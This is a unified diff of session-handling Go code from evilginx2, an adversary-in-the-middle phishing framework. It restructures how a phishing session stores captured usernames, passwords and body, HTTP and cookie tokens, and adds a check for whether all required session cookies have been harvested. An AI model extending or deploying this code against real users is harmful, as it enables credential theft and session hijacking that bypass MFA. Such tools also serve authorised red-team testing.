@@ -1,41 +1,53 @@
 package core
 
 import (
+	"time"
+
 	"github.com/kgretzky/evilginx2/database"
 )
 
 type Session struct {
-	Id            string
-	Name          string
-	Username      string
-	Password      string
-	Custom        map[string]string
-	Params        map[string]string
-	Tokens        map[string]map[string]*database.Token
-	RedirectURL   string
-	IsDone        bool
-	IsAuthUrl     bool
-	IsForwarded   bool
-	RedirectCount int
-	PhishLure     *Lure
+	Id             string
+	Name           string
+	Username       string
+	Password       string
+	Custom         map[string]string
+	Params         map[string]string
+	BodyTokens     map[string]string
+	HttpTokens     map[string]string
+	CookieTokens   map[string]map[string]*database.CookieToken
+	RedirectURL    string
+	IsDone         bool
+	IsAuthUrl      bool
+	IsForwarded    bool
+	ProgressIndex  int
+	RedirectCount  int
+	PhishLure      *Lure
+	RedirectorName string
+	LureDirPath    string
 }
 
 func NewSession(name string) (*Session, error) {
 	s := &Session{
-		Id:            GenRandomToken(),
-		Name:          name,
-		Username:      "",
-		Password:      "",
-		Custom:        make(map[string]string),
-		Params:        make(map[string]string),
-		RedirectURL:   "",
-		IsDone:        false,
-		IsAuthUrl:     false,
-		IsForwarded:   false,
-		RedirectCount: 0,
-		PhishLure:     nil,
+		Id:             GenRandomToken(),
+		Name:           name,
+		Username:       "",
+		Password:       "",
+		Custom:         make(map[string]string),
+		Params:         make(map[string]string),
+		BodyTokens:     make(map[string]string),
+		HttpTokens:     make(map[string]string),
+		RedirectURL:    "",
+		IsDone:         false,
+		IsAuthUrl:      false,
+		IsForwarded:    false,
+		ProgressIndex:  0,
+		RedirectCount:  0,
+		PhishLure:      nil,
+		RedirectorName: "",
+		LureDirPath:    "",
 	}
-	s.Tokens = make(map[string]map[string]*database.Token)
+	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
 	return s, nil
 }
@@ -52,26 +64,30 @@ func (s *Session) SetCustom(name string, value string) {
 	s.Custom[name] = value
 }
 
-func (s *Session) AddAuthToken(domain string, key string, value string, path string, http_only bool, authTokens map[string][]*AuthToken) bool {
-	if _, ok := s.Tokens[domain]; !ok {
-		s.Tokens[domain] = make(map[string]*database.Token)
+func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
+	if _, ok := s.CookieTokens[domain]; !ok {
+		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
-	if tk, ok := s.Tokens[domain][key]; ok {
+
+	if tk, ok := s.CookieTokens[domain][key]; ok {
 		tk.Name = key
 		tk.Value = value
 		tk.Path = path
 		tk.HttpOnly = http_only
 	} else {
-		s.Tokens[domain][key] = &database.Token{
+		s.CookieTokens[domain][key] = &database.CookieToken{
 			Name:     key,
 			Value:    value,
 			HttpOnly: http_only,
 		}
 	}
 
-	tcopy := make(map[string][]AuthToken)
+}
+
+func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
+	tcopy := make(map[string][]CookieAuthToken)
 	for k, v := range authTokens {
-		tcopy[k] = []AuthToken{}
+		tcopy[k] = []CookieAuthToken{}
 		for _, at := range v {
 			if !at.optional {
 				tcopy[k] = append(tcopy[k], *at)
@@ -79,8 +95,8 @@ func (s *Session) AddAuthToken(domain string, key string, value string, path str
 		}
 	}
 
-	for domain, tokens := range s.Tokens {
-		for tk, _ := range tokens {
+	for domain, tokens := range s.CookieTokens {
+		for tk := range tokens {
 			if al, ok := tcopy[domain]; ok {
 				for an, at := range al {
 					match := false
